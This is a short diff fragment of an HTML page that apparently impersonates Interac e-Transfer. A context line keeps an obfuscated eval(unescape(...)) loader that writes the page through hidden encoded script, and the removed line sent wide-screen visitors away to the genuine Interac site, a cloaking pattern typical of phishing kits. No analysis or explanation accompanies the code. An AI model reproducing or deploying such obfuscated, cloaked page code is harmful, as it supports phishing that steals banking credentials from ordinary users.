@@ -236,4 +236,4 @@ eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%72%64%32%61%65%34%3
 <noscript><i>Javascript required</i></noscript>
 
 </body>
-<script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>
+</html>
